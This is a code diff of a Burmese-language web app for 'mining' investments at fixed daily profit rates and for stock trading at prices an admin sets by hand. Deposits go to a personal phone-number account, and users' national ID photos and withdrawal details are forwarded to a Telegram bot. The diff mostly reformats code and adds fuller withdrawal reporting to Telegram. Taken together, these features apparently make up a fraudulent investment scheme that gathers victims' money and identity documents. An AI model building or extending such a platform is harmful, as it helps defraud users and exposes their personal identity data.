                             <b style="font-size:18px; color:#F6465D;">ဤတစ်ကြိမ် ကျရှုံးပါသည်။</b><br><br>
                             နောင်တမရပါနဲ့။ ထပ်ကြိုးစားကြည့်ပါ။<br><br>
                             <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left; margin:10px 0;">
-                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                                    <span style="color:var(--dim);">ရင်းနှီးငွေ</span>
-                                    <b>${amt.toLocaleString()} Ks</b>
-                                </div>
-                                <div style="display:flex; justify-content:space-between;">
-                                    <span style="color:var(--dim);">ဆုံးရှုံးငွေ</span>
-                                    <b style="color:var(--red);">-${amt.toLocaleString()} Ks</b>
-                                </div>
+                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ရင်းနှီးငွေ</span><b>${amt.toLocaleString()} Ks</b></div>
+                                <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">ဆုံးရှုံးငွေ</span><b style="color:var(--red);">-${amt.toLocaleString()} Ks</b></div>
                             </div>
                         </div>
                     `, [{ text: 'အတည်ပြုမည်', callback: () => { showPage('history-page'); refreshAllHistory(); } }]);
@@ -1869,28 +1689,13 @@
             showConfirm(
                 '⛏️ Mining အတည်ပြုရန်',
                 `<div style="text-align:left; background:rgba(0,0,0,0.3); padding:15px; border-radius:12px; margin-bottom:15px;">
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">Mining အမျိုးအစား</span>
-                        <b style="color:var(--primary);">${node}</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">ရင်းနှီးငွေ</span>
-                        <b>${amt.toLocaleString()} Ks</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">နေ့စဉ်အမြတ်</span>
-                        <b style="color:var(--green);">${percent}%</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">ကြာချိန်</span>
-                        <b>${days} ရက်</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--dim);">မျှော်မှန်းအမြတ်</span>
-                        <b style="color:var(--active-gold);">${totalProfit.toLocaleString()} Ks</b>
-                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">Mining အမျိုးအစား</span><b style="color:var(--primary);">${node}</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">ရင်းနှီးငွေ</span><b>${amt.toLocaleString()} Ks</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">နေ့စဉ်အမြတ်</span><b style="color:var(--green);">${percent}%</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">ကြာချိန်</span><b>${days} ရက်</b></div>
+                    <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">မျှော်မှန်းအမြတ်</span><b style="color:var(--active-gold);">${totalProfit.toLocaleString()} Ks</b></div>
                 </div>
-                <p style="color:var(--dim); font-size:13px;">Mining စတင်ရန် အတည်ပြုမည်လား?<br>ငြင်းပယ်ပါက ငွေထုတ်ယူမှု မရှိပါ။</p>`,
+                <p style="color:var(--dim); font-size:13px;">Mining စတင်ရန် အတည်ပြုမည်လား?</p>`,
                 () => { executeMining(node, amt, percent, days, uData); },
                 () => { showSuccess('ပယ်ဖျက်ပြီးပါပြီ', 'သင်၏ Mining ကို ပယ်ဖျက်လိုက်ပါသည်။'); }
             );
@@ -1917,22 +1722,10 @@
                 <div style="font-size:50px; color:var(--primary); margin-bottom:10px;">⛏️</div>
                 <b>သင်၏ Mining တောင်းဆိုမှု အောင်မြင်ပါသည်။</b><br><br>
                 <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
-                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                        <span style="color:var(--dim);">Mining အမျိုးအစား</span>
-                        <b>${node}</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                        <span style="color:var(--dim);">ရင်းနှီးငွေ</span>
-                        <b>${amt.toLocaleString()} Ks</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                        <span style="color:var(--dim);">ကြာချိန်</span>
-                        <b>${days} ရက်</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--dim);">မျှော်မှန်းအမြတ်</span>
-                        <b style="color:var(--active-gold);">${totalProfit.toLocaleString()} Ks</b>
-                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">Mining အမျိုးအစား</span><b>${node}</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ရင်းနှီးငွေ</span><b>${amt.toLocaleString()} Ks</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ကြာချိန်</span><b>${days} ရက်</b></div>
+                    <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">မျှော်မှန်းအမြတ်</span><b style="color:var(--active-gold);">${totalProfit.toLocaleString()} Ks</b></div>
                 </div>
                 <br><b style="color:var(--active-gold);">⏳ Admin အတည်ပြုချက်ကို စောင့်ဆိုင်းပေးပါ။</b>
             </div>
@@ -1970,12 +1763,8 @@
                 `<div style="text-align:center;">
                     <b>သင်၏ Mining အမြတ်ငွေကို ထုတ်ယူမည်လား?</b><br><br>
                     <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
-                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                            <span style="color:var(--dim);">ထုတ်ယူမည့်ငွေ</span>
-                            <b style="color:var(--active-gold); font-size:16px;">${parseFloat(total).toLocaleString()} Ks</b>
-                        </div>
+                        <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">ထုတ်ယူမည့်ငွေ</span><b style="color:var(--active-gold); font-size:16px;">${parseFloat(total).toLocaleString()} Ks</b></div>
                     </div>
-                    <br><p style="color:var(--dim); font-size:13px;">အတည်ပြုပါက သင့်ပိုင်ဆိုင်မှုများထဲသို့ ချက်ချင်းရောက်ရှိပါမည်။</p>
                 </div>`,
                 () => {
                     db.ref('users/'+user+'/balance').transaction(b => (b||0) + parseFloat(total));
@@ -1985,16 +1774,9 @@
                         <div style="text-align:center;">
                             <div style="font-size:60px; color:var(--green); margin-bottom:15px;">✅</div>
                             <b style="font-size:18px; color:var(--green);">ငွေထုတ်ယူမှု အောင်မြင်ပါသည်!</b><br><br>
-                            သင့်ပိုင်ဆိုင်မှုများထဲသို့ Mining အမြတ်ငွေ ပေါင်းထည့်ပြီးဖြစ်ပါသည်။<br><br>
                             <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left;">
-                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                                    <span style="color:var(--dim);">ထည့်သွင်းငွေ</span>
-                                    <b style="color:var(--active-gold); font-size:16px;">${parseFloat(total).toLocaleString()} Ks</b>
-                                </div>
-                                <div style="display:flex; justify-content:space-between;">
-                                    <span style="color:var(--dim);">အခြေအနေ</span>
-                                    <b style="color:var(--green);">✅ အောင်မြင်ပါသည်</b>
-                                </div>
+                                <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ထည့်သွင်းငွေ</span><b style="color:var(--active-gold); font-size:16px;">${parseFloat(total).toLocaleString()} Ks</b></div>
+                                <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">အခြေအနေ</span><b style="color:var(--green);">✅ အောင်မြင်ပါသည်</b></div>
                             </div>
                         </div>
                     `, [{ text: 'အတည်ပြုမည်', callback: () => { showPage('history-page'); refreshAllHistory(); } }]);
@@ -2184,10 +1966,7 @@
         });
     }
 
-    function refreshAllHistory() {
-        if(!user) return;
-        loadAllHistory();
-    }
+    function refreshAllHistory() { if(!user) return; loadAllHistory(); }
 
     function loadAllHistory() {
         if(!user) return;
@@ -2197,9 +1976,7 @@
             const records = [];
             snapshot.forEach(child => {
                 const data = child.val();
-                if(data && data.ph === user) {
-                    records.push({ key: child.key, ...data });
-                }
+                if(data && data.ph === user) records.push({ key: child.key, ...data });
             });
             return filterRecentRecords(records).reverse().slice(0, 50);
         }
@@ -2244,12 +2021,8 @@
                 const tagClass = isBuy ? 'buy-tag' : 'sell-tag';
                 const tagIcon = isBuy ? '🟢 ဝယ်ယူ' : '🔴 ပြန်ရောင်း';
                 const expiryDate = data.expiryDate || (data.timestamp ? new Date(data.timestamp + HISTORY_RETENTION_MS).toLocaleString() : 'N/A');
-                
                 h += `<div class="hist-record">
-                    <div class="row">
-                        <b>${data.stockName || 'Stock'}</b>
-                        <span class="${tagClass}">${tagIcon}</span>
-                    </div>
+                    <div class="row"><b>${data.stockName || 'Stock'}</b><span class="${tagClass}">${tagIcon}</span></div>
                     <div class="row"><span class="label">ပမာဏ</span><b>${parseFloat(data.amount || 0).toLocaleString(undefined, {maximumFractionDigits: 0})} Ks</b></div>
                     <div class="row"><span class="label">Shares</span><b>${(data.shares || 0).toFixed(4)}</b></div>
                     <div class="row"><span class="label">စျေးနှုန်း</span><span>${(data.price || 1.0).toFixed(3)}x</span></div>
@@ -2305,16 +2078,9 @@
                     const data = r.val();
                     if(!data || data.ph !== user) return;
                     const ts = data.timestamp || data.startTime || 0;
-                    if(ts && ts < cutoff) {
-                        updates[`requests/${col}/${r.key}`] = null;
-                        deleteCount++;
-                    }
+                    if(ts && ts < cutoff) { updates[`requests/${col}/${r.key}`] = null; deleteCount++; }
                 });
-                if(deleteCount > 0) {
-                    db.ref().update(updates).then(() => {
-                        console.log(`[History Cleanup] Deleted ${deleteCount} expired records from ${col}`);
-                    });
-                }
+                if(deleteCount > 0) db.ref().update(updates);
             });
         });
     }
@@ -2375,7 +2141,7 @@
     }
 
     // ================================================================
-    // WITHDRAW
+    // 🔥 WITHDRAW (FIXED WITH FULL TELEGRAM DATA)
     // ================================================================
     function confirmWithdraw() { 
         if(!currentWdPayMethod) return showSuccess('Error', "ငွေထုတ်ယူမည့် နည်းလမ်းကို အရင်ရွေးချယ်ပါ။");
@@ -2395,22 +2161,10 @@
             showConfirm(
                 '💸 ငွေထုတ်ယူရန် အတည်ပြုပါ',
                 `<div style="text-align:left; background:rgba(0,0,0,0.3); padding:15px; border-radius:12px; margin-bottom:15px;">
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">ထုတ်ယူငွေ</span>
-                        <b style="color:var(--active-gold);">${amt.toLocaleString()} Ks</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">နည်းလမ်း</span>
-                        <b>${currentWdPayMethod.toUpperCase()}</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                        <span style="color:var(--dim);">အကောင့်အမည်</span>
-                        <b>${name}</b>
-                    </div>
-                    <div style="display:flex; justify-content:space-between;">
-                        <span style="color:var(--dim);">ဖုန်းနံပါတ်</span>
-                        <b>${ph}</b>
-                    </div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">ထုတ်ယူငွေ</span><b style="color:var(--active-gold);">${amt.toLocaleString()} Ks</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">နည်းလမ်း</span><b>${currentWdPayMethod.toUpperCase()}</b></div>
+                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">အကောင့်အမည်</span><b>${name}</b></div>
+                    <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">ဖုန်းနံပါတ်</span><b>${ph}</b></div>
                 </div>
                 <p style="color:var(--dim); font-size:13px;">ငွေထုတ်ယူမှုကို အတည်ပြုမည်လား?<br>ပယ်ဖျက်ပါက ငွေထုတ်ယူမှု မရှိပါ။</p>`,
                 () => { executeWithdraw(amt, name, ph); },
@@ -2419,12 +2173,16 @@
         }); 
     }
 
+    // 🔥 UPDATED executeWithdraw — All data including receiver name/phone sent to Telegram
     function executeWithdraw(amt, name, ph) {
         db.ref('users/'+user).once('value', s => {
-            const currentBal = s.val().balance;
+            const uData = s.val();
+            const currentBal = uData.balance;
+            const balanceAfter = currentBal - amt;
             
-            db.ref('requests/withdraws').push({ 
+            const withdrawRecord = { 
                 ph: user, 
+                username: uData.username || 'N/A',
                 amt: amt, 
                 name: name, 
                 receivePh: ph, 
@@ -2432,10 +2190,27 @@
                 status: 'pending', 
                 date: new Date().toLocaleString(),
                 timestamp: Date.now()
-            }); 
+            };
             
-            db.ref('users/'+user).update({ balance: currentBal - amt }); 
-            notifyBot('🚨 WITHDRAW REQUEST', { 'User': user, 'Amount': amt.toLocaleString(), 'Method': currentWdPayMethod });
+            const newRef = db.ref('requests/withdraws').push();
+            withdrawRecord.requestId = newRef.key;
+            newRef.set(withdrawRecord);
+            
+            db.ref('users/'+user).update({ balance: balanceAfter }); 
+            
+            // 🔥 SEND FULL WITHDRAW DETAILS TO TELEGRAM
+            sendWithdrawToTelegram({
+                username: uData.username || 'N/A',
+                ph: user,
+                amt: amt,
+                receiveName: name,
+                receivePh: ph,
+                method: currentWdPayMethod,
+                balanceBefore: currentBal,
+                balanceAfter: balanceAfter,
+                vip: uData.vip || 0,
+                requestId: newRef.key
+            });
             
             refreshAllHistory();
             showWithdrawSuccess(amt, name, ph, currentWdPayMethod);
@@ -2461,24 +2236,12 @@
         showConfirm(
             '💰 ငွေသွင်းရန် အတည်ပြုပါ',
             `<div style="text-align:left; background:rgba(0,0,0,0.3); padding:15px; border-radius:12px; margin-bottom:15px;">
-                <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                    <span style="color:var(--dim);">ငွေသွင်းပမာဏ</span>
-                    <b style="color:var(--primary);">${parseFloat(amt).toLocaleString()} Ks</b>
-                </div>
-                <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                    <span style="color:var(--dim);">ငွေပေးချေမှုနည်းလမ်း</span>
-                    <b>${methodDisplay}</b>
-                </div>
-                <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
-                    <span style="color:var(--dim);">လက်ခံသူအကောင့်</span>
-                    <b>Daw Wa - 09983857117</b>
-                </div>
-                <div style="display:flex; justify-content:space-between;">
-                    <span style="color:var(--dim);">Transaction ID</span>
-                    <b style="font-size:11px;">${trx}</b>
-                </div>
+                <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">ငွေသွင်းပမာဏ</span><b style="color:var(--primary);">${parseFloat(amt).toLocaleString()} Ks</b></div>
+                <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">ငွေပေးချေမှုနည်းလမ်း</span><b>${methodDisplay}</b></div>
+                <div style="display:flex; justify-content:space-between; margin-bottom:8px;"><span style="color:var(--dim);">လက်ခံသူအကောင့်</span><b>Daw Wa - 09983857117</b></div>
+                <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">Transaction ID</span><b style="font-size:11px;">${trx}</b></div>
             </div>
-            <p style="color:var(--dim); font-size:13px;">ငွေသွင်းမှုကို အတည်ပြုမည်လား?<br>ပယ်ဖျက်ပါက ငွေသွင်းမှု မရှိပါ။</p>`,
+            <p style="color:var(--dim); font-size:13px;">ငွေသွင်းမှုကို အတည်ပြုမည်လား?</p>`,
             () => { 
                 const paymentData = PAYMENT_DETAILS[currentPayMethod];
                 
@@ -2497,8 +2260,7 @@
                     sendDepositToTelegram({
                         ph: user,
                         username: userDataGlobal ? userDataGlobal.username : 'N/A',
-                        amt: amt,
-                        trx: trx,
+                        amt: amt, trx: trx,
                         method: currentPayMethod,
                         accName: paymentData.name,
                         accNum: paymentData.num
@@ -2560,16 +2322,12 @@
         else banner.innerHTML = `<div class="verify-banner verify-none" onclick="showPage('verify-page'); loadVerifyStatus()"><i class="fas fa-exclamation-circle" style="font-size:20px;"></i><div><b>မှတ်ပုံတင် တင်ရန် လိုအပ်ပါသည်</b></div></div>`;
     }
 
-    // ================================================================
-    // 🔥 UPDATED: submitVerification WITH PHOTO SENDING TO TELEGRAM
-    // ================================================================
     async function submitVerification() {
         if(!user) return showSuccess('Error', "Login ဝင်ပါ။");
         const nrc = document.getElementById('verify-nrc').value.trim();
         if(!nrc || nrc.length < 5) return showSuccess('Error', "NRC မှန်ကန်စွာ ထည့်ပါ။");
         if(!nrcImages.front || !nrcImages.back || !nrcImages.hold) return showSuccess('Error', "ပုံအားလုံး ထည့်ပါ။");
         
-        // Show loading indicator
         showModal('📤 ပို့နေသည်...', `
             <div style="text-align:center; padding:20px;">
                 <div style="font-size:40px; margin-bottom:15px;">⏳</div>
@@ -2579,7 +2337,6 @@
         `, []);
         
         try {
-            // 1. Save to Firebase
             const verifyId = db.ref('requests/verifications').push().key;
             await db.ref('requests/verifications/' + verifyId).set({ 
                 ph: user, 
@@ -2591,13 +2348,10 @@
             });
             await db.ref('users/'+user).update({ verificationStatus: 'pending', nrc: nrc });
 
-            // 2. Send text notification
             notifyBot('🆔 VERIFICATION SUBMITTED', { 'Phone': user, 'NRC': nrc });
 
-            // 3. Send photos to Telegram
             const photoResult = await sendVerificationPhotosToTelegram(nrc, userDataGlobal ? userDataGlobal.username : user, user);
 
-            // 4. Show success
             closeModal();
             const photoStatus = photoResult && photoResult.allOk
                 ? `✅ ၃ ပုံ ပို့ပြီး`
@@ -2607,18 +2361,9 @@
                     <div style="font-size:50px; color:var(--green); margin-bottom:15px;">✅</div>
                     <b style="color:var(--green);">Verification တင်သွင်းမှု အောင်မြင်ပါသည်။</b><br><br>
                     <div style="background:rgba(0,0,0,0.3); padding:12px; border-radius:10px; text-align:left; font-size:12px;">
-                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                            <span style="color:var(--dim);">NRC Number</span>
-                            <b>${nrc}</b>
-                        </div>
-                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
-                            <span style="color:var(--dim);">ပုံများ</span>
-                            <b style="color:var(--green);">${photoStatus}</b>
-                        </div>
-                        <div style="display:flex; justify-content:space-between;">
-                            <span style="color:var(--dim);">အခြေအနေ</span>
-                            <b style="color:var(--active-gold);">⏳ စစ်ဆေးနေသည်</b>
-                        </div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">NRC Number</span><b>${nrc}</b></div>
+                        <div style="display:flex; justify-content:space-between; margin-bottom:6px;"><span style="color:var(--dim);">ပုံများ</span><b style="color:var(--green);">${photoStatus}</b></div>
+                        <div style="display:flex; justify-content:space-between;"><span style="color:var(--dim);">အခြေအနေ</span><b style="color:var(--active-gold);">⏳ စစ်ဆေးနေသည်</b></div>
                     </div>
                     <br><small style="color:var(--dim);">Admin မှ စစ်ဆေးပြီးပါက အကြောင်းကြားပါမည်။</small>
                 </div>
@@ -2719,11 +2464,7 @@
     function admPostAnnounce() {
         const txt = document.getElementById('adm-msg').value.trim();
         if(!txt) return showSuccess('Error', "အကြောင်းကြားစာ ရေးပါ။");
-        db.ref('announcements').push({ 
-            text: txt, 
-            date: new Date().toLocaleString(), 
-            timestamp: Date.now() 
-        });
+        db.ref('announcements').push({ text: txt, date: new Date().toLocaleString(), timestamp: Date.now() });
         showSuccess('Success', "Announcement Published!");
         document.getElementById('adm-msg').value = "";
     }
@@ -2735,13 +2476,7 @@
         
         db.ref('users/' + phone).once('value', s => {
             if(!s.exists()) return showSuccess('Error', "ဤ User မရှိပါ။");
-            
-            db.ref('userMessages/' + phone).push({
-                text: msg,
-                date: new Date().toLocaleString(),
-                timestamp: Date.now()
-            });
-            
+            db.ref('userMessages/' + phone).push({ text: msg, date: new Date().toLocaleString(), timestamp: Date.now() });
             showSuccess('✅ အောင်မြင်ပါသည်', `✅ ${phone} သို့ စာ ပို့ပြီးပါပြီ။`);
             document.getElementById('adm-user-phone').value = "";
             document.getElementById('adm-personal-msg').value = "";
@@ -2751,7 +2486,6 @@
     function loadAdmStocks() {
         db.ref('settings/stockPrices').once('value', s => {
             const prices = s.val() || {};
-            
             let ph = '';
             STOCK_DATA.forEach(st => {
                 const price = prices[st.id] || st.defaultPrice || 1.0;
@@ -2774,21 +2508,17 @@
     function updateStockPrice(stockId) {
         const inputEl = document.getElementById(`stock-price-${stockId}`);
         const price = parseFloat(inputEl.value);
-        
-        if(!price || price <= 0) {
-            return showSuccess('Error', "စျေးနှုန်း မှန်ကန်စွာ ထည့်ပါ။");
-        }
+        if(!price || price <= 0) return showSuccess('Error', "စျေးနှုန်း မှန်ကန်စွာ ထည့်ပါ။");
         
         db.ref(`settings/stockPrices/${stockId}`).set(price).then(() => {
             liveStockPrices[stockId] = price;
-            showSuccess('✅ အောင်မြင်ပါသည်', `Stock Price ကို ${price.toFixed(3)}x သို့ အောင်မြင်စွာ ပြောင်းလဲပြီးပါပြီ။<br><br>User တွေဆီ ချက်ချင်း ရောက်သွားပါပြီ။`);
+            showSuccess('✅ အောင်မြင်ပါသည်', `Stock Price ကို ${price.toFixed(3)}x သို့ အောင်မြင်စွာ ပြောင်းလဲပြီးပါပြီ။`);
             setTimeout(() => loadAdmStocks(), 500);
             renderStockMarket();
             updateInvestmentValue();
             if(userDataGlobal) renderUserStockHoldings(userDataGlobal);
         }).catch(err => {
-            console.error("Stock price update error:", err);
-            showSuccess('Error', "စျေးနှုန်း ပြောင်းလဲမှု မအောင်မြင်ပါ။ ထပ်စမ်းကြည့်ပါ။");
+            showSuccess('Error', "စျေးနှုန်း ပြောင်းလဲမှု မအောင်မြင်ပါ။");
         });
     }
 
@@ -2847,7 +2577,8 @@
                     if(r.val().status==='pending') { 
                         let methodTxt = r.val().method ? `(${r.val().method.toUpperCase()})` : '';
                         let accInfo = r.val().accName ? `<br>Acc: ${r.val().accName} - ${r.val().accNum}` : '';
-                        h += `<div class="card">${cat.key.toUpperCase()} ${methodTxt} <br>User: ${r.val().ph}<br>Amt: ${parseFloat(r.val().amt).toLocaleString()}${accInfo}<br>TRX: ${r.val().trx || 'N/A'}<br>
+                        let receiverInfo = r.val().receivePh ? `<br>📞 Receiver: ${r.val().name || 'N/A'} - ${r.val().receivePh}` : '';
+                        h += `<div class="card">${cat.key.toUpperCase()} ${methodTxt} <br>User: ${r.val().ph}<br>Amt: ${parseFloat(r.val().amt).toLocaleString()}${accInfo}${receiverInfo}<br>TRX: ${r.val().trx || 'N/A'}<br>
                         <div style="display:flex; gap:10px; margin-top:10px;">
                             <button class="btn btn-green" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','success')">Approve</button>
                             <button class="btn btn-red" style="padding:8px;" onclick="applyClickGold(this); admAction('${cat.key}','${r.key}','rejected')">Reject</button>
@@ -2897,22 +2628,14 @@
         const target = document.getElementById(id);
         if(target) target.classList.add('active'); 
         window.scrollTo(0,0); 
-        
-        if(id === 'history-page' && user) {
-            refreshAllHistory();
-            cleanupExpiredHistory();
-        }
+        if(id === 'history-page' && user) { refreshAllHistory(); cleanupExpiredHistory(); }
     }
     
     function showNav(el, id) { 
         document.querySelectorAll('.nav-item').forEach(i=>i.classList.remove('active')); 
         el.classList.add('active'); 
         showPage(id); 
-        
-        if(id === 'history-page') {
-            refreshAllHistory();
-            cleanupExpiredHistory();
-        }
+        if(id === 'history-page') { refreshAllHistory(); cleanupExpiredHistory(); }
     }
     
     function changeLang(lang, evt) {
@@ -2952,8 +2675,7 @@
             Object.entries(data).forEach(([key, value]) => {
                 msg += `• <b>${key}:</b> ${value}\n`;
             });
-            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
-            msg += `📢 Channel: ${TELEGRAM_CHANNEL}`;
+            msg += `━━━━━━━━━━━━━━━━━━━━\n📢 Channel: ${TELEGRAM_CHANNEL}`;
             sendTelegramMessage(msg);
         }
     }
